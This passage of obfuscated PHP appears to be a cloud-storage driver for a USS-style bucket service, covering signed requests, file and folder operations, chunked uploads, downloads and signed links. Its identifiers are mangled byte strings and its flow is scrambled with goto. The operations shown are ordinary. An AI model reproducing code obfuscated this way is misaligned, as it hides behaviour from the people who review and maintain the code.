gmdate($bÅçøñ–Üø[1269]); $fˆ“É•à…… = base64_encode(hash_hmac($bÅçøñ–Üø[1304], "{$DÖ†Ô¿èäŞ}\46{$cç²‹êÊ…‚}\46{$E¯óÁ”ó‹Ô}", md5("{$this->userpass}"), !0)); $E™Ø­¶¬íö = array("\101\165\x74\x68\x6f\162\x69\172\141\164\151\157\x6e\x3a\x55\120\131\x55\x4e\x20{$this->username}\72{$fˆ“É•à……}", "\104\141\x74\145\x3a{$E¯óÁ”ó‹Ô}"); return $E™Ø­¶¬íö; } public function ussRequest($eƒ¨Û®°”, $BŠœ’¬éÜ = "\107\x45\124", $dâƒË²™ç¾ = false, $f¬ğè†íä = false, $D‰Ìë†‡¿ = false) { goto EÎ›˜Ÿ©½Š; cƒÒÄœ»ë„: $F¥¹ÏñĞö¯ = $this->ussHeaders($dÅ‰µïÜšç, $BŠœ’¬éÜ); if ($f¬ğè†íä) { $F¥¹ÏñĞö¯ = array_merge($F¥¹ÏñĞö¯, $f¬ğè†íä); } $dÇ…ÓÃ˜Î§ = url_request($this->endpoint . $dÅ‰µïÜšç, $BŠœ’¬éÜ, $dâƒË²™ç¾, $F¥¹ÏñĞö¯, $D‰Ìë†‡¿); goto BÔƒ‰é¿ŒÍ; BÔƒ‰é¿ŒÍ: if (!$dÇ…ÓÃ˜Î§) { return array($fâíœ ŒÜ[1062] => !1, $fâíœ ŒÜ[1064] => $fâíœ ŒÜ[1305]); } if (strtolower($BŠœ’¬éÜ) == $fâíœ ŒÜ[190] || in_array($dÇ…ÓÃ˜Î§[$fâíœ ŒÜ[1062]], array($fâíœ ŒÜ[1163], $fâíœ ŒÜ[1306]))) { $dâƒË²™ç¾ = $dÇ…ÓÃ˜Î§[$fâíœ ŒÜ[1307]]; } else { $dâƒË²™ç¾ = json_decode($dÇ…ÓÃ˜Î§[$fâíœ ŒÜ[1064]], !0); if (!$dâƒË²™ç¾) { $dâƒË²™ç¾ = $dÇ…ÓÃ˜Î§[$fâíœ ŒÜ[1064]]; } else { if (!$dÇ…ÓÃ˜Î§[$fâíœ ŒÜ[702]] && isset($dâƒË²™ç¾[$fâíœ ŒÜ[1308]])) { $dâƒË²™ç¾ = $dâƒË²™ç¾[$fâíœ ŒÜ[1308]]; } } } return array($fâíœ ŒÜ[1062] => $dÇ…ÓÃ˜Î§[$fâíœ ŒÜ[702]], $fâíœ ŒÜ[1064] => $dâƒË²™ç¾); goto BŠ…ò ²¼Œ; EÎ›˜Ÿ©½Š: $fâíœ ŒÜ =& $_SERVER[Š‰]; $eƒ¨Û®°” = trim($eƒ¨Û®°”, $fâíœ ŒÜ[8]); $dÅ‰µïÜšç = "\57{$this->bucket}\x2f{$eƒ¨Û®°”}"; goto cƒÒÄœ»ë„; BŠ…ò ²¼Œ: } public function mkfile($fÔˆ¢¯µ¨Ä, $b±çµ™«„ = '', $bŞ»ä©™Ü³ = REPEAT_RENAME) { if ($this->setContent($fÔˆ¢¯µ¨Ä, $b±çµ™«„)) { return $this->getPathOuter($fÔˆ¢¯µ¨Ä); } return !1; } public function mkdir($cï‡ë³æ, $EÅ¦Ï£ô‚Ë = REPEAT_SKIP) { $fÕĞ©äğÉ¼ =& $_SERVER[Š‰]; $E±® Œ†® = trim($cï‡ë³æ, $fÕĞ©äğÉ¼[8]); if ($this->_isFolder($E±® Œ†®)) { return $this->getPathOuter($E±® Œ†®); } $eˆÊ‡²òö® = array($fÕĞ©äğÉ¼[1309]); $a§¼‰Ò‚• = $this->ussRequest($E±® Œ†®, $fÕĞ©äğÉ¼[222], !1, $eˆÊ‡²òö®); return $a§¼‰Ò‚•[$fÕĞ©äğÉ¼[1062]] ? $this->getPathOuter($E±® Œ†®) : !1; } public function copyFile($e»¦‡‘©½Š, $bÊÚ²ÎèŸƒ) { $A‚•¾áœ¯ˆ =& $_SERVER[Š‰]; $A‰È¼·‹éÛ = array($A‚•¾áœ¯ˆ[1310] . "\57{$this->bucket}\57{$e»¦‡‘©½Š}", $A‚•¾áœ¯ˆ[1311]); $f‡Â¾â“‹Ô = $this->ussRequest($bÊÚ²ÎèŸƒ, $A‚•¾áœ¯ˆ[224], !1, $A‰È¼·‹éÛ); return $f‡Â¾â“‹Ô[$A‚•¾áœ¯ˆ[1062]] ? !0 : $this->getPathOuter($bÊÚ²ÎèŸƒ); } public function moveFile($b¤ïÍ„ëî, $AôŞÆ±Œ†) { $cÇ§îİ˜‘® =& $_SERVER[Š‰]; $añô™‹´ğˆ = array($cÇ§îİ˜‘®[1312] . "\57{$this->bucket}\x2f{$b¤ïÍ„ëî}", $cÇ§îİ˜‘®[1311]); $FÈÏİ»Ù½ = $this->ussRequest($AôŞÆ±Œ†, $cÇ§îİ˜‘®[224], !1, $añô™‹´ğˆ); return $FÈÏİ»Ù½[$cÇ§îİ˜‘®[1062]] ? !0 : $this->getPathOuter($AôŞÆ±Œ†); } public function delFile($bË‹©ŞÇè ) { $bŒˆê˜®×® =& $_SERVER[Š‰]; $dÀ°ï”¾×¢ = $this->ussRequest($bË‹©ŞÇè , $bŒˆê˜®×®[1313]); return $dÀ°ï”¾×¢[$bŒˆê˜®×®[1062]] ? !0 : !1; } public function delFolder($D¾ğ¤Ç§) { goto f¯‰ğÌÖˆ; fÇ§¢¶Ò‹¦: return $Aİ®ÉŞÑ„»[$CŞÏé“½¦[1062]]; goto dŒ…»áÀíã; C†¾ÀÉ°Õ: $AàœµÅØßõ = $a‚‰ÀÏÙ = array(); $this->fileList($D¾ğ¤Ç§, $AàœµÅØßõ, $a‚‰ÀÏÙ, !0); $this->listItemCache = !0; goto c¬Ô‰÷Á¢Ï; c¬Ô‰÷Á¢Ï: foreach ($a‚‰ÀÏÙ as $c‚àÊŞì‘) { $Aİ®ÉŞÑ„» = $this->ussRequest($c‚àÊŞì‘[$CŞÏé“½¦[28]], $CŞÏé“½¦[1313]); if (!$Aİ®ÉŞÑ„»[$CŞÏé“½¦[1062]]) { return !1; } } foreach ($AàœµÅØßõ as $A‹ÛÊ„Šåá) { $Aİ®ÉŞÑ„» = $this->ussRequest($A‹ÛÊ„Šåá, $CŞÏé“½¦[1313]); if (!$Aİ®ÉŞÑ„»[$CŞÏé“½¦[1062]]) { return !1; } } $Aİ®ÉŞÑ„» = $this->ussRequest($D¾ğ¤Ç§, $CŞÏé“½¦[1313]); goto fÇ§¢¶Ò‹¦; f¯‰ğÌÖˆ: $CŞÏé“½¦ =& $_SERVER[Š‰]; if (!$this->exist($D¾ğ¤Ç§)) { return !0; } $this->listItemCache = !1; goto C†¾ÀÉ°Õ; dŒ…»áÀíã: } public function rename($b¢ÁãöÉ¤Ò, $CâÌÖ¦´ÉŸ) { if ($this->isFile($b¢ÁãöÉ¤Ò)) { $CâÌÖ¦´ÉŸ = get_path_father($b¢ÁãöÉ¤Ò) . $CâÌÖ¦´ÉŸ; return $this->moveFile($b¢ÁãöÉ¤Ò, $CâÌÖ¦´ÉŸ); } return $this->renameObject($b¢ÁãöÉ¤Ò, $CâÌÖ¦´ÉŸ); } public function fileInfo($Dšá‡ËØ»–, $B“ë©é‡Í– = false, $AÒ‰Ú–• = array()) { goto fÌƒêŠğç; AÖÛË¹Ÿ‹: $f°˜•¶¯å‡[$EÁ‚¨íØƒ[192]] = $f°˜•¶¯å‡[$EÁ‚¨íØƒ[83]] = 0; $f°˜•¶¯å‡[$EÁ‚¨íØƒ[193]] = $f°˜•¶¯å‡[$EÁ‚¨íØƒ[194]] = !0; if (empty($AÒ‰Ú–•)) { $AÒ‰Ú–• = $this->objectMeta($Dšá‡ËØ»–); if (!$AÒ‰Ú–•) { return $f°˜•¶¯å‡; } } goto A‹À· èÊ¿; fÌƒêŠğç: $EÁ‚¨íØƒ =& $_SERVER[Š‰]; $f°˜•¶¯å‡ = array($EÁ‚¨íØƒ[28] => $this->pathThis($Dšá‡ËØ»–), $EÁ‚¨íØƒ[75] => $this->getPathOuter($EÁ‚¨íØƒ[8] . $Dšá‡ËØ»–), $EÁ‚¨íØƒ[29] => $EÁ‚¨íØƒ[173], $EÁ‚¨íØƒ[77] => isset($AÒ‰Ú–•[$EÁ‚¨íØƒ[77]]) ? $AÒ‰Ú–•[$EÁ‚¨íØƒ[77]] : 0, $EÁ‚¨íØƒ[167] => $this->ext($Dšá‡ËØ»–)); if ($B“ë©é‡Í–) { return $f°˜•¶¯å‡; } goto AÖÛË¹Ÿ‹; fµĞ¸ùµ—ç: return $f°˜•¶¯å‡; goto e‰Ÿâ²ø¡; A‹À· èÊ¿: $f°˜•¶¯å‡[$EÁ‚¨íØƒ[192]] = intval($AÒ‰Ú–•[$EÁ‚¨íØƒ[1314]]); $f°˜•¶¯å‡[$EÁ‚¨íØƒ[83]] = intval($AÒ‰Ú–•[$EÁ‚¨íØƒ[1315]]); $f°˜•¶¯å‡[$EÁ‚¨íØƒ[77]] = $AÒ‰Ú–•[$EÁ‚¨íØƒ[77]]; goto fµĞ¸ùµ—ç; e‰Ÿâ²ø¡: } public function folderInfo($fÊŒÃËÖÊ, $D„¤ª¹”á¯ = false) { goto e¿«î»°÷; bæî•±Ôô: $C×¡ªÊÄ±[$bÃ¥‰¯ô©¡[192]] = intval($dºçá¼‡‰[$bÃ¥‰¯ô©¡[1314]]); $C×¡ªÊÄ±[$bÃ¥‰¯ô©¡[83]] = intval($dºçá¼‡‰[$bÃ¥‰¯ô©¡[1315]]); return $C×¡ªÊÄ±; goto F·Æäğ¸¤ò; dÙòò·È³: $C×¡ªÊÄ±[$bÃ¥‰¯ô©¡[192]] = $C×¡ªÊÄ±[$bÃ¥‰¯ô©¡[83]] = 0; $C×¡ªÊÄ±[$bÃ¥‰¯ô©¡[193]] = $C×¡ªÊÄ±[$bÃ¥‰¯ô©¡[194]] = !0; if (empty($dºçá¼‡‰)) { $dºçá¼‡‰ = $this->objectMeta($fÊŒÃËÖÊ); if (!$dºçá¼‡‰) { return $C×¡ªÊÄ±; } } goto bæî•±Ôô; e¿«î»°÷: $bÃ¥‰¯ô©¡ =& $_SERVER[Š‰]; $C×¡ªÊÄ± = array($bÃ¥‰¯ô©¡[28] => $this->pathThis($fÊŒÃËÖÊ), $bÃ¥‰¯ô©¡[75] => $this->getPathOuter($bÃ¥‰¯ô©¡[8] . $fÊŒÃËÖÊ), $bÃ¥‰¯ô©¡[29] => $bÃ¥‰¯ô©¡[76]); if ($D„¤ª¹”á¯) { return $C×¡ªÊÄ±; } goto dÙòò·È³; F·Æäğ¸¤ò: } private function listObjs($cÅÌˆ‘ç, $AËÕôª£Ÿ = 0, $Bõ‹¶³„–ì = 1000) { $Bå‡¶‰ô•… =& $_SERVER[Š‰]; $A…´±ò˜²Ñ = array($Bå‡¶‰ô•…[1316], $Bå‡¶‰ô•…[1317] . $Bõ‹¶³„–ì); if ($AËÕôª£Ÿ) { $A…´±ò˜²Ñ[] = $Bå‡¶‰ô•…[1318] . $AËÕôª£Ÿ; } $F²Ü‹¼…òß = $this->ussRequest($cÅÌˆ‘ç, $Bå‡¶‰ô•…[226], !1, $A…´±ò˜²Ñ); return !$F²Ü‹¼…òß[$Bå‡¶‰ô•…[1062]] ? !1 : $F²Ü‹¼…òß[$Bå‡¶‰ô•…[1064]]; } private function fileList($d¡î ¢–Ä¡, &$BçÀºŒ–„, &$eÒÍ‚îÉ£“, $B´ÙÛœ…´ä = false) { goto Fâ‚ç¬â¶¤; f®ÎÄ“Œ¬: $e™äªÍÍç¼ = rtrim($d¡î ¢–Ä¡, $CîÚ­Ø©ÍŸ[8]) . $CîÚ­Ø©ÍŸ[8]; $Eßªæ°×Ê = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $c„‰§Ş¡¬© = $this->listObjs($d¡î ¢–Ä¡, $AÏ‡œ“ïÓŸ, $bÀÆŒãîï­); if (!$c„‰§Ş¡¬©) { return !1; } $AÏ‡œ“ïÓŸ = isset($c„‰§Ş¡¬©[$CîÚ­Ø©ÍŸ[1319]]) ? $c„‰§Ş¡¬©[$CîÚ­Ø©ÍŸ[1319]] : $CîÚ­Ø©ÍŸ[33]; $aÒæøßÃ­Õ = isset($c„‰§Ş¡¬©[$CîÚ­Ø©ÍŸ[1320]]) ? $c„‰§Ş¡¬©[$CîÚ­Ø©ÍŸ[1320]] : array(); foreach ($aÒæøßÃ­Õ as $fä¶²‰ ¥Ï) { $FÙ–©Â…Òõ = $fä¶²‰ ¥Ï[$CîÚ­Ø©ÍŸ[29]] == $CîÚ­Ø©ÍŸ[76] ? !0 : !1; $Cù†ÅÙŠÊç = ltrim($e™äªÍÍç¼ . $fä¶²‰ ¥Ï[$CîÚ­Ø©ÍŸ[28]], $CîÚ­Ø©ÍŸ[8]) . ($FÙ–©Â…Òõ ? $CîÚ­Ø©ÍŸ[8] : $CîÚ­Ø©ÍŸ[33]); $aøÜ­ÊœÑ = array($CîÚ­Ø©ÍŸ[28] => $Cù†ÅÙŠÊç, $CîÚ­Ø©ÍŸ[29] => $FÙ–©Â…Òõ ? $CîÚ­Ø©ÍŸ[76] : $CîÚ­Ø©ÍŸ[173], $CîÚ­Ø©ÍŸ[77] => $fä¶²‰ ¥Ï[$CîÚ­Ø©ÍŸ[333]], $CîÚ­Ø©ÍŸ[1315] => $fä¶²‰ ¥Ï[$CîÚ­Ø©ÍŸ[1321]]); if ($Eßªæ°×Ê) { $this->cacheMethod($CîÚ­Ø©ÍŸ[197], $Cù†ÅÙŠÊç, $FÙ–©Â…Òõ); $this->cacheMethod($CîÚ­Ø©ÍŸ[198], $Cù†ÅÙŠÊç, $aøÜ­ÊœÑ); } if ($FÙ–©Â…Òõ) { $BçÀºŒ–„[] = $Cù†ÅÙŠÊç; if ($B´ÙÛœ…´ä) { $this->fileList($Cù†ÅÙŠÊç, $BçÀºŒ–„, $eÒÍ‚îÉ£“, $B´ÙÛœ…´ä); } continue; } $eÒÍ‚îÉ£“[] = $aøÜ­ÊœÑ; } if (count($aÒæøßÃ­Õ) < $bÀÆŒãîï­) { break; } } goto DÄ¯Ğ¥Ñ’; DÄ¯Ğ¥Ñ’: if ($Eßªæ°×Ê) { $this->cacheMethod($CîÚ­Ø©ÍŸ[197], $d¡î ¢–Ä¡, !0); } goto b±Ø™ÓˆÁ”; Fâ‚ç¬â¶¤: $CîÚ­Ø©ÍŸ =& $_SERVER[Š‰]; $AÏ‡œ“ïÓŸ = $CîÚ­Ø©ÍŸ[33]; $bÀÆŒãîï­ = 1000; goto f®ÎÄ“Œ¬; b±Ø™ÓˆÁ”: } public function listPath($F‚¼¼ŒŸ”, $a·ŞĞĞ±» = false) { $a¸¿£² ê‘ =& $_SERVER[Š‰]; $F·³¬ˆöë“ = $eáª ²öé° = array(); $this->fileList($F‚¼¼ŒŸ”, $F·³¬ˆöë“, $eáª ²öé°); foreach ($F·³¬ˆöë“ as $eùØø©²¨ğ => $e½§Ãì›¦Ä) { $F·³¬ˆöë“[$eùØø©²¨ğ] = $this->folderInfo($e½§Ãì›¦Ä, $a·ŞĞĞ±»); } foreach ($eáª ²öé° as $eùØø©²¨ğ => $e½§Ãì›¦Ä) { $eáª ²öé°[$eùØø©²¨ğ] = $this->fileInfo($e½§Ãì›¦Ä[$a¸¿£² ê‘[28]], $a·ŞĞĞ±», $e½§Ãì›¦Ä); } return array($a¸¿£² ê‘[74] => $F·³¬ˆöë“, $a¸¿£² ê‘[73] => $eáª ²öé°); } public function has($FË‹«¢µ©, $f»ÚÇ“¢‘¹ = false, $D†¥¸˜Å· = true) { goto bÄ©°éã¡»; Bì«Ÿ¦ÃĞæ: while (!0) { check_abort(); $b½ËØ‡êŒõ = $this->listObjs($FË‹«¢µ©, $dÄ¦İ¶ñ¶, $b¤…ó„‹ù); if (!$b½ËØ‡êŒõ) { return !1; } $dÄ¦İ¶ñ¶ = isset($b½ËØ‡êŒõ[$e¢°À„£á[1319]]) ? $b½ËØ‡êŒõ[$e¢°À„£á[1319]] : $e¢°À„£á[33]; $Dº—ê„…ËĞ = isset($b½ËØ‡êŒõ[$e¢°À„£á[1320]]) ? $b½ËØ‡êŒõ[$e¢°À„£á[1320]] : array(); if (empty($Dº—ê„…ËĞ)) { break; } $f²²¯ĞÌÃŠ = array_filter($Dº—ê„…ËĞ, function ($BªíÉÇÎ¾õ) { $f½íÔôº¬— =& $_SERVER[Š‰]; return $BªíÉÇÎ¾õ[$f½íÔôº¬—[29]] == $f½íÔôº¬—[76]; }); $BêáÏÅåÚ‰ = count($Dº—ê„…ËĞ); $f²²¯ĞÌÃŠ = count($f²²¯ĞÌÃŠ); $b¾İŒîïÈ = $BêáÏÅåÚ‰ - $f²²¯ĞÌÃŠ; if ($f»ÚÇ“¢‘¹) { $DÁªğ÷ŠÈğ += $f²²¯ĞÌÃŠ; $AäÀƒ‰©ñ += $b¾İŒîïÈ; if ($BêáÏÅåÚ‰ < $b¤…ó„‹ù) { break; } continue; } if ($D†¥¸˜Å·) { if ($b¾İŒîïÈ) { return !0; } } else { if ($f²²¯ĞÌÃŠ) { return !0; } } if ($BêáÏÅåÚ‰ < $b¤…ó„‹ù) { break; } } if ($f»ÚÇ“¢‘¹) { return array($e¢°À„£á[201] => $AäÀƒ‰©ñ, $e¢°À„£á[202] => $DÁªğ÷ŠÈğ); } return !1; goto cÜÚê„áèÀ; bÄ©°éã¡»: $e¢°À„£á =& $_SERVER[Š‰]; $dÄ¦İ¶ñ¶ = $e¢°À„£á[33]; $b¤…ó„‹ù = 500; goto b¬òÂ¶«¡ì; b¬òÂ¶«¡ì: $AäÀƒ‰©ñ = 0; $DÁªğ÷ŠÈğ = 0; $cÈÚí™‚Ê– = rtrim($FË‹«¢µ©, $e¢°À„£á[8]) . $e¢°À„£á[8]; goto Bì«Ÿ¦ÃĞæ; cÜÚê„áèÀ: } public function listAll($eœöªÆ êÚ) { goto Eáíëç¢Ä¯; C„ß¹èÌ·: $A„‡‚Õ›‘° = array(); foreach ($Fêé¦³ÙŞ as $f®÷–ïº¡å) { $A„‡‚Õ›‘°[$f®÷–ïº¡å[$bİÄÓ®¡‹Ã[28]]] = $f®÷–ïº¡å[$bİÄÓ®¡‹Ã[77]]; } foreach ($FÂÏ¿ï™ôÙ as $f®÷–ïº¡å) { if (is_string($f®÷–ïº¡å)) { $A„‡‚Õ›‘°[$f®÷–ïº¡å] = 0; } } goto b‹…¸¢î²ë; Eáíëç¢Ä¯: $bİÄÓ®¡‹Ã =& $_SERVER[Š‰]; $FÂÏ¿ï™ôÙ = $Fêé¦³ÙŞ = array(); $this->fileList($eœöªÆ êÚ, $FÂÏ¿ï™ôÙ, $Fêé¦³ÙŞ, !0); goto C„ß¹èÌ·; b‹…¸¢î²ë: return $this->listAllFiles($eœöªÆ êÚ, array_keys($A„‡‚Õ›‘°), $A„‡‚Õ›‘°); goto A‰Š»¿÷§; A‰Š»¿÷§: } public function canRead($CÈô¤®›ã‘) { return $this->exist($CÈô¤®›ã‘) ? !0 : !1; } public function canWrite($Eäó¸Öµ¥£) { return $this->exist($Eäó¸Öµ¥£) ? !0 : !1; } public function getContent($a¹Ó÷ÂŸ²) { return $this->fileSubstr($a¹Ó÷ÂŸ², 0, -1); } public function setContent($fËÆ…ºòõ¤, $dÖ“‡„åêÕ = '') { $C¯ó•Ä¼áÜ =& $_SERVER[Š‰]; if (!$dÖ“‡„åêÕ) { $e—Ù—£åø¿ = $this->ussRequest($fËÆ…ºòõ¤, $C¯ó•Ä¼áÜ[222]); return $e—Ù—£åø¿[$C¯ó•Ä¼áÜ[1062]]; } $dŒ•‰™Áğ = $this->tempFile($this->pathThis($fËÆ…ºòõ¤)); file_put_contents($dŒ•‰™Áğ, $dÖ“‡„åêÕ); if ($this->upload($fËÆ…ºòõ¤, $dŒ•‰™Áğ)) { $this->tempFileRemve($dŒ•‰™Áğ); return !0; } return !1; } public function fileSubstr($c»ƒ•¶ƒÚñ, $bÂéÃØ´¯, $AŞ±ÖœêÜ†) { $c‚‚Â—²×ù =& $_SERVER[Š‰]; if (!($Dá¡ÙÉ±Òõ = $this->link($c»ƒ•¶ƒÚñ))) { return !1; } $E†™‡Öò®· = !1; if ($AŞ±ÖœêÜ† > 0) { $d»…ìØĞâ¹ = $bÂéÃØ´¯ + $AŞ±ÖœêÜ† - 1; $E†™‡Öò®· = array($c‚‚Â—²×ù[1282] . $bÂéÃØ´¯ . $c‚‚Â—²×ù[434] . $d»…ìØĞâ¹); } $cóìáŠ¸†µ = url_request($Dá¡ÙÉ±Òõ, $c‚‚Â—²×ù[226], !1, $E†™‡Öò®·); return $cóìáŠ¸†µ[$c‚‚Â—²×ù[702]] ? $cóìáŠ¸†µ[$c‚‚Â—²×ù[1064]] : !1; } public function upload($A¾æ—Ù‹Ä, $A„…ÈÉéáØ, $fÓ»ƒ×¬ = false, $C›Ûá¨î„‹ = REPEAT_REPLACE) { goto FÛ„šñÊ½; böçï„¥ƒ: if (!$DîœƒÕÁÆ[$A ÁÊ‡”[1062]]) { return !1; } $c´êÁ¿„‘³ = $DîœƒÕÁÆ[$A ÁÊ‡”[1064]]; $a÷‹êç½ö = 0; goto DŠ¿ÛÖÎë…; DŠ¿ÛÖÎë…: $DõÓÊˆáãâ = $c´êÁ¿„‘³[$A ÁÊ‡”[1327]]; $Eµò‚Éº… = fopen($A„…ÈÉéáØ, $A ÁÊ‡”[1232]); if (!$Eµò‚Éº…) { return !1; } goto EĞÔÃ´áÛÙ; EĞÔÃ´áÛÙ: do { $B»½ÒëğÕ  = $c´êÁ¿„‘³[$A ÁÊ‡”[1328]]; fseek_64($Eµò‚Éº…, $a÷‹êç½ö); $FêâĞêø¤” = fread($Eµò‚Éº…, $B»½ÒëğÕ ); $B–Š¥ÃŒ™Ş = 0; do { $B–Š¥ÃŒ™Ş++; $c´êÁ¿„‘³ = $this->uploadPart($A¾æ—Ù‹Ä, $c´êÁ¿„‘³, $FêâĞêø¤”); } while (!$c´êÁ¿„‘³ && $B–Š¥ÃŒ™Ş < 3); if (!$c´êÁ¿„‘³) { return !1; } $DõÓÊˆáãâ = $c´êÁ¿„‘³[$A ÁÊ‡”[1327]]; $a÷‹êç½ö += $B»½ÒëğÕ ; } while ($DõÓÊˆáãâ != -1); fclose($Eµò‚Éº…); $CÛù¤–¬… = array($A ÁÊ‡”[1329], $A ÁÊ‡”[1330] . $c´êÁ¿„‘³[$A ÁÊ‡”[1331]], $A ÁÊ‡”[1325]); goto cÈ¦Ï÷½àö; FÀĞŠÌÆİ : $f‡ÑÓì“»Œ = 1024 * 1024 * 10; $CÛù¤–¬… = array($A ÁÊ‡”[1323], $A ÁÊ‡”[1324] . $fêÄ‡·˜Û², $A ÁÊ‡”[1325], $A ÁÊ‡”[1326] . $f‡ÑÓì“»Œ); $DîœƒÕÁÆ = $this->ussRequest($A¾æ—Ù‹Ä, $A ÁÊ‡”[224], !1, $CÛù¤–¬…); goto böçï„¥ƒ; FÛ„šñÊ½: $A ÁÊ‡” =& $_SERVER[Š‰]; $fêÄ‡·˜Û² = IO::size($A„…ÈÉéáØ); if ($fêÄ‡·˜Û² <= 1024 * 1024 * 200) { $DÂè£ÔİÖÃ = array($A ÁÊ‡”[1322] . $A„…ÈÉéáØ); $DîœƒÕÁÆ = $this->ussRequest($A¾æ—Ù‹Ä, $A ÁÊ‡”[224], $DÂè£ÔİÖÃ); return $DîœƒÕÁÆ[$A ÁÊ‡”[1062]] ? $this->getPathOuter($A¾æ—Ù‹Ä) : !1; } goto FÀĞŠÌÆİ ; cÈ¦Ï÷½àö: $DîœƒÕÁÆ = $this->ussRequest($A¾æ—Ù‹Ä, $A ÁÊ‡”[224], !1, $CÛù¤–¬…); return $DîœƒÕÁÆ[$A ÁÊ‡”[1062]] ? $this->getPathOuter($b”ÌÊ«ÎÂĞ) : !1; goto aÂãê‚Ê¶¾; aÂãê‚Ê¶¾: } private function uploadPart($D™µ×ëİÔß, $Déé×åĞšÆ, &$a¥è©ãåÙ») { $C£ğˆïå¢× =& $_SERVER[Š‰]; $D¥Áëõƒ¾´ = array($C£ğˆïå¢×[1332], $C£ğˆïå¢×[1330] . $Déé×åĞšÆ[$C£ğˆïå¢×[1331]], $C£ğˆïå¢×[1333] . $Déé×åĞšÆ[$C£ğˆïå¢×[1327]], $C£ğˆïå¢×[140] . $Déé×åĞšÆ[$C£ğˆïå¢×[1328]]); $B£¡¼ğ¾ù = $this->ussRequest($D™µ×ëİÔß, $C£ğˆïå¢×[224], $a¥è©ãåÙ», $D¥Áëõƒ¾´); return !$B£¡¼ğ¾ù[$C£ğˆïå¢×[1062]] ? $B£¡¼ğ¾ù[$C£ğˆïå¢×[1062]] : $B£¡¼ğ¾ù[$C£ğˆïå¢×[1064]]; } public function uploadFormData($Dğš¶íœÃË, $fÒ¸ÎÑ¿² = 3600) { return $this->uploadPolicy($Dğš¶íœÃË, $fÒ¸ÎÑ¿²); } public function multiUploadFormData($FÒõğ¿‘, $FößĞ—†õÔ = 3600) { $bêá‡‘ŒÖ =& $_SERVER[Š‰]; $aÕÃÓÄÑÌ = (int) $GLOBALS[$bêá‡‘ŒÖ[7]][$bêá‡‘ŒÖ[77]]; return $this->uploadPolicy($FÒõğ¿‘, $FößĞ—†õÔ, $aÕÃÓÄÑÌ); } private function uploadPolicy($cÉêÙ­İĞ, $aïÜææÁ = 3600, $F½ŸÕøíÉĞ = 0) { goto d¦ªµ­¸×; C’Ìà–¹ˆ¸: $bê¦ìÍˆ‚› = base64_encode(hash_hmac($cŞË”¶Ğ·[1304], "\120\117\123\124\46{$B£ªÉäËÄ}\46{$cƒÆ˜‘†õƒ}\x26{$c•âÂ‚Êé¿}", md5("{$this->userpass}"), !0)); $e¥·¦Ó•Äº = array($cŞË”¶Ğ·[1175] => $c•âÂ‚Êé¿, $cŞË”¶Ğ·[1338] => "\125\120\131\x55\x4e\x20{$this->username}\x3a{$bê¦ìÍˆ‚›}", $cŞË”¶Ğ·[175] => $this->endpoint . $B£ªÉäËÄ); return $e¥·¦Ó•Äº; goto E”ÒôöÓ‘Ù; d¦ªµ­¸×: $cŞË”¶Ğ· =& $_SERVER[Š‰]; $B£ªÉäËÄ = $cŞË”¶Ğ·[8] . $this->bucket; $cƒÆ˜‘†õƒ = gmdate($cŞË”¶Ğ·[1269]); goto A¯òÆ‚…®å; A¯òÆ‚…®å: $C³ôÇÙÖ = array($cŞË”¶Ğ·[1334] => $this->bucket, $cŞË”¶Ğ·[1335] => $cÉêÙ­İĞ, $cŞË”¶Ğ·[1336] => time() + $aïÜææÁ, $cŞË”¶Ğ·[1337] => $cƒÆ˜‘†õƒ); if ($F½ŸÕøíÉĞ) { $C³ôÇÙÖ[$cŞË”¶Ğ·[1248]] = $F½ŸÕøíÉĞ; } $c•âÂ‚Êé¿ = base64_encode(json_encode($C³ôÇÙÖ)); goto C’Ìà–¹ˆ¸; E”ÒôöÓ‘Ù: } public function download($f•®¾†ÂÎ, $D„âå¯ç°) { goto aä§ªÚõÖ«; fŠ¥–±†öĞ: $D¼èš¥‰Òí = 1024 * 200; $B‡Á¬ß‡Ü = fopen($Eº‘–¾‹•Ô, $_SERVER[Š‰][1288]); while (!0) { $Aäõ‹ôÓµñ = $this->fileSubstr($f•®¾†ÂÎ, $E‚‘¤–ê, $D¼èš¥‰Òí); if ($Aäõ‹ôÓµñ === !1) { return !1; } fwrite($B‡Á¬ß‡Ü, $Aäõ‹ôÓµñ); $E‚‘¤–ê += $D¼èš¥‰Òí; if (strlen($Aäõ‹ôÓµñ) < $D¼èš¥‰Òí) { break; } } goto B¿äšœÏ¯…; aä§ªÚõÖ«: $Eº‘–¾‹•Ô = IO::getPathInner(IO::mkfile($D„âå¯ç°)); if (!($Aìª­áÏ´‹ = $this->link($f•®¾†ÂÎ))) { return !1; } $E‚‘¤–ê = 0; goto fŠ¥–±†öĞ; B¿äšœÏ¯…: fclose($B‡Á¬ß‡Ü); return $D„âå¯ç°; goto C©òÒğë³¢; C©òÒğë³¢: } public function link($EŸøÙ¯¨† , $c‚¸Ã’íØÜ = array()) { $A¥ŒƒâÅÍË =& $_SERVER[Š‰]; $EŸøÙ¯¨†  = trim($EŸøÙ¯¨† , $A¥ŒƒâÅÍË[8]); if (!empty($this->token)) { $eÕ§ÏÇ¬… = strtotime(date($A¥ŒƒâÅÍË[1339])); $Eãù·Îíö = substr(md5($this->token . $A¥ŒƒâÅÍË[280] . $eÕ§ÏÇ¬… . $A¥ŒƒâÅÍË[1340] . $EŸøÙ¯¨† ), 12, 8) . $eÕ§ÏÇ¬…; $c‚¸Ã’íØÜ[] = $A¥ŒƒâÅÍË[1341] . $Eãù·Îíö; } $BÆÓÎã = !empty($c‚¸Ã’íØÜ) ? $A¥ŒƒâÅÍË[69] . implode($A¥ŒƒâÅÍË[280], $c‚¸Ã’íØÜ) : $A¥ŒƒâÅÍË[33]; return $this->getHost() . $A¥ŒƒâÅÍË[8] . $EŸøÙ¯¨†  . $BÆÓÎã; } public function fileOut($A…ÈÇáš, $bØˆ÷ˆÈ•Á = false, $Bå™‡Æ‚ª = false, $aØ­ªƒºŠÈ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($A…ÈÇáš, $bØˆ÷ˆÈ•Á, $Bå™‡Æ‚ª, $aØ­ªƒºŠÈ); } if (!$Bå™‡Æ‚ª) { $Bå™‡Æ‚ª = $this->pathThis($A…ÈÇáš); } $B·éáœ×Ì = $bØˆ÷ˆÈ•Á ? array($_SERVER[Š‰][1342] . rawurlencode($Bå™‡Æ‚ª)) : array(); $Bªµ¬á‘…Â = $this->link($A…ÈÇáš, $B·éáœ×Ì); $this->fileOutLink($Bªµ¬á‘…Â); } public function fileOutServer($a¶ø”ÂÉœÃ, $c•îŒ‰Ê‘Ğ = false, $Dî©ñÌ„ïˆ = false, $Eˆá˜Å‡Ø¾ = '') { 